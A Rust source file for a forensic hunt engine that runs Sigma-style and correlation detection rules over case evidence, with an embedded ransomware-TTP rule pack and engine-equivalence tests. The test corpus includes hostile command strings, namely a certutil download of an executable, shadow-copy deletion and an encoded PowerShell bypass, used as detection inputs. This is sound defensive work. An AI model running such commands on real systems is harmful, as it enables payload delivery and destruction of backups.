//! `fx-hunt` — the hunt engine.
//!
//! Runs two detection engines over a case and writes their unified results back
//! to the store:
//!   * single-event rules (Sigma-subset) matched in Rust over streamed events;
//!   * correlation rules compiled to windowed SQL and run in the store.
//!
//! Rules are loaded from YAML so an analyst extends coverage without a rebuild.
//! A rule pack ships in `rules/` mapping the financially-motivated-actor TTPs
//! this tool targets.

pub mod correlation;
pub mod event_rule;
pub mod import;
pub mod ioc;
pub mod sigma;
pub mod report;

use correlation::{detection_from_row, CorrelationRule};
use event_rule::EventRule;
use fx_core::{Detection, DetectionEngine, Severity};
use fx_store::CaseStore;
use uuid::Uuid;

/// A loaded rule set.
#[derive(Default)]
pub struct RuleSet {
    pub event_rules: Vec<EventRule>,
    pub correlation_rules: Vec<CorrelationRule>,
    /// Non-fatal load problems (a bad rule file shouldn't sink the run).
    pub load_errors: Vec<String>,
}

impl RuleSet {
    /// Load every `*.yml` / `*.yaml` under `dir`. A file is one of two shapes,
    /// discriminated by its top-level `kind:` — `event` or `correlation`.
    /// Load the rules shipped with the tool, compiled directly into the binary.
    /// This is filesystem-independent — the rules travel inside the executable,
    /// so it works no matter where the app is run from. This is what the GUI
    /// uses by default. `EMBEDDED_RULES` is generated below via include_str!.
    pub fn from_embedded() -> Self {
        let mut set = RuleSet::default();
        for (name, text) in EMBEDDED_RULES {
            set.load_str(text, name);
        }
        set
    }

    pub fn load_dir(dir: &std::path::Path) -> Self {
        let mut set = RuleSet::default();
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(e) => {
                set.load_errors.push(format!("read rules dir {}: {e}", dir.display()));
                return set;
            }
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
            if ext != "yml" && ext != "yaml" {
                continue;
            }
            match std::fs::read_to_string(&path) {
                Ok(text) => set.load_str(&text, &path.display().to_string()),
                Err(e) => set.load_errors.push(format!("read {}: {e}", path.display())),
            }
        }
        set
    }

    /// Parse one YAML document, routing by its `kind` field.
    pub fn load_str(&mut self, text: &str, origin: &str) {
        #[derive(serde::Deserialize)]
        struct Kind {
            kind: String,
        }
        let kind = match serde_yaml::from_str::<Kind>(text) {
            Ok(k) => k.kind,
            Err(e) => {
                self.load_errors.push(format!("{origin}: missing/invalid `kind`: {e}"));
                return;
            }
        };
        match kind.as_str() {
            "event" => match serde_yaml::from_str::<EventRule>(text) {
                Ok(r) => self.event_rules.push(r),
                Err(e) => self.load_errors.push(format!("{origin}: {e}")),
            },
            "correlation" => match serde_yaml::from_str::<CorrelationRule>(text) {
                Ok(r) => self.correlation_rules.push(r),
                Err(e) => self.load_errors.push(format!("{origin}: {e}")),
            },
            other => self
                .load_errors
                .push(format!("{origin}: unknown kind `{other}`")),
        }
    }

    pub fn len(&self) -> usize {
        self.event_rules.len() + self.correlation_rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }
}

/// Result of a hunt run.
pub struct HuntReport {
    pub detections: usize,
    pub rules_run: usize,
    pub errors: Vec<String>,
}

/// Run every rule against the case and persist the detections.
pub fn run(store: &CaseStore, rules: &RuleSet) -> HuntReport {
    let mut detections: Vec<Detection> = Vec::new();
    let mut errors = rules.load_errors.clone();

    // ── Single-event engine ────────────────────────────────────────────────
    if !rules.event_rules.is_empty() {
        let (dets, err) = scan_events(store, &rules.event_rules, DetectionEngine::SingleEvent);
        detections.extend(dets);
        if let Some(e) = err {
            errors.push(e);
        }
    }

    // ── Correlation engine ─────────────────────────────────────────────────
    if !rules.correlation_rules.is_empty() && !fx_core::progress::cancelled() {
        fx_core::progress::set_current("Correlation rules");
    }
    for rule in &rules.correlation_rules {
        if fx_core::progress::cancelled() {
            break;
        }
        let sql = rule.correlation.to_sql();
        match store.run_correlation(&sql) {
            Ok(rows) => {
                for row in rows {
                    detections.push(detection_from_row(
                        rule,
                        &row.group,
                        row.first_ts,
                        row.event_ids,
                        row.magnitude,
                    ));
                }
            }
            Err(e) => errors.push(format!("correlation `{}`: {e}", rule.id)),
        }
    }

    // Worst-first ordering for the analyst.
    detections.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then(a.timestamp.cmp(&b.timestamp))
    });

    let count = detections.len();
    if let Err(e) = store.write_detections(&detections) {
        errors.push(format!("persist detections: {e}"));
    }

    HuntReport {
        detections: count,
        rules_run: rules.len(),
        errors,
    }
}

/// One streamed pass over every event, offering each to the compiled rule
/// set. Rules are pre-compiled into one combined matcher per event field (see
/// `CompiledRules`), so hundreds or thousands of rules cost about the same per
/// event as tens.
fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngine) -> (Vec<Detection>, Option<String>) {
    let mut detections: Vec<Detection> = Vec::new();
    // Parse `raw` per row only if some loaded rule reads a raw-backed field
    // (event.id / extras.* / Sigma EventData fields).
    let needs_raw = crate::event_rule::any_rule_needs_raw(ev_rules);
    // The MFT parser emits one event per $SI timestamp (M/A/C/B) of a record,
    // so a rule matching a file fired up to 4x for one file. Merge hits for the
    // same (rule, evidence file, MFT record) into a single finding: earliest
    // timestamp, all contributing event ids. Scoped to MFT on purpose — other
    // parsers can share a source_ref across genuinely distinct entries.
    let mut mft_seen: std::collections::HashMap<(String, Uuid, String), usize> = std::collections::HashMap::new();
    let mut compiled = crate::event_rule::GatedRules::new(ev_rules);
    let mut hit_buf: Vec<bool> = Vec::new();
    let mut matched: Vec<usize> = Vec::new();
    fx_core::progress::start_scan(store.event_count().unwrap_or(0));
    let mut tick: u64 = 0;
    let mut stopped = false;
    let scan = store.for_each_event(needs_raw, |ev| {
        // Progress + cancel, checked every 4096 events to keep the hot loop cheap.
        tick += 1;
        if tick & 4095 == 0 {
            fx_core::progress::add_scanned(4096);
            stopped = fx_core::progress::cancelled();
        }
        if stopped {
            return;
        }
        compiled.matching(ev, &mut hit_buf, &mut matched);
        for &ri in &matched {
            let rule = &ev_rules[ri];
            if ev.artefact == fx_core::ArtefactKind::Mft {
                if let Some(sref) = &ev.provenance.source_ref {
                    let key = (rule.id.clone(), ev.provenance.evidence_id, sref.clone());
                    if let Some(&idx) = mft_seen.get(&key) {
                        let d: &mut Detection = &mut detections[idx];
                        d.event_ids.push(ev.id);
                        if ev.timestamp < d.timestamp {
                            d.timestamp = ev.timestamp;
                        }
                        continue;
                    }
                    mft_seen.insert(key, detections.len());
                }
            }
            detections.push(Detection {
                id: Uuid::new_v4(),
                rule_id: rule.id.clone(),
                title: rule.title.clone(),
                severity: rule.severity,
                attack: rule.attack.clone(),
                summary: single_summary(rule, ev),
                event_ids: vec![ev.id],
                timestamp: ev.timestamp,
                host: ev.host.clone(),
                engine,
            });
        }
    });
    fx_core::progress::add_scanned(tick & 4095);
    (detections, scan.err().map(|e| format!("single-event scan: {e}")))
}

/// Per-rule outcome of a Sigma run.
#[derive(Debug, Clone, serde::Serialize)]
pub struct SigmaRuleHit {
    pub rule_id: String,
    pub sigma_id: String,
    pub title: String,
    pub level: String,
    pub author: String,
    pub logsource: String,
    pub findings: usize,
    pub events: usize,
    pub first_seen: Option<String>,
    pub last_seen: Option<String>,
}

/// Result of running a Sigma folder against the open case.
#[derive(Debug, serde::Serialize)]
pub struct SigmaRunReport {
    pub folder: String,
    pub loaded: usize,
    pub filtered: usize,
    pub files_seen: usize,
    pub skipped_by_reason: std::collections::BTreeMap<String, usize>,
    pub skipped_examples: Vec<sigma::SigmaSkip>,
    pub loaded_by_source: std::collections::BTreeMap<String, usize>,
    pub folder_error: Option<String>,
    pub rules_hit: usize,
    pub findings: usize,
    pub hits: Vec<SigmaRuleHit>,
    pub errors: Vec<String>,
}

/// Run already-loaded Sigma rules against the case. Replaces the previous
/// Sigma findings only — built-in rule and IOC findings are untouched.
pub fn run_sigma(store: &CaseStore, folder: &str, load: &sigma::SigmaLoad) -> SigmaRunReport {
    let mut errors = Vec::new();
    let mut dets = Vec::new();
    if !load.rules.is_empty() {
        let (d, err) = scan_events(store, &load.rules, DetectionEngine::Sigma);
        dets = d;
        if let Some(e) = err {
            errors.push(e);
        }
    }
    dets.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.timestamp.cmp(&b.timestamp)));
    if let Err(e) = store.replace_sigma_detections(&dets) {
        errors.push(format!("persist Sigma findings: {e}"));
    }
    let fmt = time::macros::format_description!("[year]-[month]-[day]T[hour]:[minute]:[second]");
    let mut by_rule: std::collections::BTreeMap<String, SigmaRuleHit> = std::collections::BTreeMap::new();
    for d in &dets {
        let meta = load.meta.get(&d.rule_id);
        let ts = d.timestamp.format(&fmt).ok();
        let h = by_rule.entry(d.rule_id.clone()).or_insert_with(|| SigmaRuleHit {
            rule_id: d.rule_id.clone(),
            sigma_id: meta.map(|m| m.sigma_id.clone()).unwrap_or_default(),
            title: d.title.clone(),
            level: meta.map(|m| m.level.clone()).unwrap_or_default(),
            author: meta.map(|m| m.author.clone()).unwrap_or_default(),
            logsource: meta.map(|m| m.logsource.clone()).unwrap_or_default(),
            findings: 0,
            events: 0,
            first_seen: None,
            last_seen: None,
        });
        h.findings += 1;
        h.events += d.event_ids.len();
        if let Some(t) = ts {
            if h.first_seen.as_ref().map_or(true, |f| &t < f) {
                h.first_seen = Some(t.clone());
            }
            if h.last_seen.as_ref().map_or(true, |l| &t > l) {
                h.last_seen = Some(t);
            }
        }
    }
    let rank = |l: &str| match l { "critical" => 0, "high" => 1, "medium" => 2, "low" => 3, _ => 4 };
    let mut hits: Vec<SigmaRuleHit> = by_rule.into_values().collect();
    hits.sort_by(|a, b| rank(&a.level).cmp(&rank(&b.level)).then(b.findings.cmp(&a.findings)));
    SigmaRunReport {
        folder: folder.to_string(),
        loaded: load.loaded,
        filtered: load.filtered,
        files_seen: load.files_seen,
        skipped_by_reason: load.skipped_by_reason.clone(),
        skipped_examples: load.skipped_examples.clone(),
        loaded_by_source: load.loaded_by_source.clone(),
        folder_error: load.folder_error.clone(),
        rules_hit: hits.len(),
        findings: dets.len(),
        hits,
        errors,
    }
}

fn single_summary(rule: &EventRule, ev: &fx_core::Event) -> String {
    // Prefer the most specific locus available for the analyst.
    let locus = ev
        .process
        .as_ref()
        .and_then(|p| p.command_line.clone().or_else(|| p.path.clone()))
        .or_else(|| ev.target.as_ref().and_then(|t| t.path.clone()))
        .unwrap_or_else(|| ev.message.clone());
    format!("{}: {}", rule.title, truncate(&locus, 160))
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        let mut out: String = s.chars().take(n).collect();
        out.push('…');
        out
    }
}

/// Severity helper re-exported for the CLI/GUI without pulling in fx-core there.
pub fn severity_rank(s: Severity) -> u8 {
    match s {
        Severity::Informational => 1,
        Severity::Low => 2,
        Severity::Medium => 3,
        Severity::High => 4,
        Severity::Critical => 5,
    }
}

/// Every rule file shipped with the tool, compiled into the binary via
/// include_str! (paths relative to this source file: ../rules/).
static EMBEDDED_RULES: &[(&str, &str)] = &[
    ("credential_access_lsass.yml", include_str!("../rules/credential_access_lsass.yml")),
    ("credential_access_secrets.yml", include_str!("../rules/credential_access_secrets.yml")),
    ("data_staging_tools.yml", include_str!("../rules/data_staging_tools.yml")),
    ("defender_asr_block.yml", include_str!("../rules/defender_asr_block.yml")),
    ("defender_detections.yml", include_str!("../rules/defender_detections.yml")),
    ("defender_tampering.yml", include_str!("../rules/defender_tampering.yml")),
    ("defense_evasion_indicators.yml", include_str!("../rules/defense_evasion_indicators.yml")),
    ("discovery_recon_commands.yml", include_str!("../rules/discovery_recon_commands.yml")),
    ("execution_lolbin_abuse.yml", include_str!("../rules/execution_lolbin_abuse.yml")),
    ("execution_powershell_suspicious.yml", include_str!("../rules/execution_powershell_suspicious.yml")),
    ("group_akira_ttps.yml", include_str!("../rules/group_akira_ttps.yml")),
    ("group_inc_ransom_ttps.yml", include_str!("../rules/group_inc_ransom_ttps.yml")),
    ("group_interlock_ttps.yml", include_str!("../rules/group_interlock_ttps.yml")),
    ("group_lockbit_clop_ttps.yml", include_str!("../rules/group_lockbit_clop_ttps.yml")),
    ("group_play_dragonforce_ttps.yml", include_str!("../rules/group_play_dragonforce_ttps.yml")),
    ("group_qilin_ttps.yml", include_str!("../rules/group_qilin_ttps.yml")),
    ("group_thegentlemen_ttps.yml", include_str!("../rules/group_thegentlemen_ttps.yml")),
    ("lateral_movement_remote_exec.yml", include_str!("../rules/lateral_movement_remote_exec.yml")),
    ("mass_rename_ransomware.yml", include_str!("../rules/mass_rename_ransomware.yml")),
    ("offensive_tooling.yml", include_str!("../rules/offensive_tooling.yml")),
    ("persistence_autostart_hijack.yml", include_str!("../rules/persistence_autostart_hijack.yml")),
    ("persistence_mechanisms.yml", include_str!("../rules/persistence_mechanisms.yml")),
    ("ransomware_shared_tooling.yml", include_str!("../rules/ransomware_shared_tooling.yml")),
    ("rdp_outbound_history.yml", include_str!("../rules/rdp_outbound_history.yml")),
    ("rdp_then_tooling.yml", include_str!("../rules/rdp_then_tooling.yml")),
    ("remote_access_session.yml", include_str!("../rules/remote_access_session.yml")),
    ("remote_access_transfer_or_command.yml", include_str!("../rules/remote_access_transfer_or_command.yml")),
    ("rmm_tool_execution.yml", include_str!("../rules/rmm_tool_execution.yml")),
    ("runmru_hands_on_keyboard.yml", include_str!("../rules/runmru_hands_on_keyboard.yml")),
    ("shadow_copy_deletion.yml", include_str!("../rules/shadow_copy_deletion.yml")),
    ("srum_bulk_exfil.yml", include_str!("../rules/srum_bulk_exfil.yml")),
    ("suspicious_parent_child.yml", include_str!("../rules/suspicious_parent_child.yml")),
    ("suspicious_scheduled_task.yml", include_str!("../rules/suspicious_scheduled_task.yml")),
    ("system_binary_masquerade.yml", include_str!("../rules/system_binary_masquerade.yml")),
];


#[cfg(test)]
mod embedded_rules_tests {
    /// Every rule file on disk must be embedded, or the GUI (which uses the
    /// embedded set) silently runs fewer rules than the CLI (which reads the
    /// directory). This list is hand-maintained, so guard it.
    #[test]
    fn every_rule_file_is_embedded() {
        let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/rules");
        let mut on_disk: Vec<String> = std::fs::read_dir(dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .filter(|n| n.ends_with(".yml"))
            .collect();
        on_disk.sort();
        let mut embedded: Vec<String> =
            super::EMBEDDED_RULES.iter().map(|(n, _)| n.to_string()).collect();
        embedded.sort();
        assert_eq!(on_disk, embedded, "rules/ and EMBEDDED_RULES differ");
    }

    /// Every embedded rule's self-tests pass — through BOTH the per-rule path
    /// and the compiled (combined-matcher) path, which must always agree.
    #[test]
    fn embedded_rule_examples_and_engine_equivalence() {
        use crate::event_rule::{event_from_example, CompiledRules};
        let rs = super::RuleSet::from_embedded();
        let rules = &rs.event_rules;
        let compiled = CompiledRules::new(rules);
        let (mut hit, mut out) = (Vec::new(), Vec::new());
        let mut failures = Vec::new();
        let mut examples = 0;
        for (ri, r) in rules.iter().enumerate() {
            for (want, set) in [(true, &r.tests.should_match), (false, &r.tests.no_match)] {
                for ex in set {
                    examples += 1;
                    let ev = event_from_example(ex);
                    let old = r.matches(&ev);
                    compiled.matching(&ev, &mut hit, &mut out);
                    let new = out.contains(&ri);
                    if old != new {
                        failures.push(format!("{}: engines disagree on {:?}", r.id, ex));
                    } else if old != want {
                        failures.push(format!("{}: expected {} on {:?}", r.id, if want { "match" } else { "no match" }, ex));
                    }
                }
            }
        }
        // Synthetic cross-traffic: every literal value from every rule, plus
        // typical benign strings, placed in each commonly-used field.
        let mut corpus: Vec<String> = vec![
            r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule".into(),
            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgA".into(),
            r"C:\PerfLogs\a.exe".into(), r"certutil -urlcache -f http://x/y.exe y.exe".into(),
            r"vssadmin delete shadows /all /quiet".into(), "process.start".into(), "".into(),
        ];
        fn lits(c: &crate::event_rule::Condition, out: &mut Vec<String>) {
            use crate::event_rule::Condition::*;
            match c { All { all } => all.iter().for_each(|x| lits(x, out)), Any { any } => any.iter().for_each(|x| lits(x, out)),
                      Not { not } => lits(not, out), Match { match_ } => out.extend(match_.values.iter().cloned()) }
        }
        for r in rules { lits(&r.detection, &mut corpus); }
        let mut gated = crate::event_rule::GatedRules::new(rules);
        let (mut gh, mut go) = (Vec::new(), Vec::new());
        for v in &corpus {
            for field in ["process.command_line", "process.name", "process.path", "target.path", "message", "action", "process.parent_name"] {
                for art in ["evtx", "mft", "prefetch"] {
                    let mut ex = std::collections::BTreeMap::new();
                    ex.insert(field.to_string(), v.clone());
                    ex.insert("artefact".to_string(), art.to_string());
                    let ev = event_from_example(&ex);
                    compiled.matching(&ev, &mut hit, &mut out);
                    gated.matching(&ev, &mut gh, &mut go);
                    for (ri, r2) in rules.iter().enumerate() {
                        if r2.matches(&ev) != out.contains(&ri) || out.contains(&ri) != go.contains(&ri) {
                            failures.push(format!("{}: engines disagree on {field}={v:?} ({art})", r2.id));
                        }
                    }
                }
            }
        }
        for r in rules {
            for ex in r.tests.should_match.iter().chain(r.tests.no_match.iter()) {
                let ev = event_from_example(ex);
                compiled.matching(&ev, &mut hit, &mut out);
                for (ri, r2) in rules.iter().enumerate() {
                    if r2.matches(&ev) != out.contains(&ri) {
                        failures.push(format!("{} vs example of {}: engines disagree", r2.id, r.id));
                    }
                }
            }
        }
        assert!(failures.is_empty(), "{} of {} examples failed:\n{}", failures.len(), examples, failures.join("\n"));
    }

    /// Every embedded rule must parse.
    #[test]
    fn embedded_rules_all_load() {
        let rs = super::RuleSet::from_embedded();
        assert!(rs.load_errors.is_empty(), "rule load errors: {:?}", rs.load_errors);
        assert_eq!(rs.len(), super::EMBEDDED_RULES.len());
    }
}
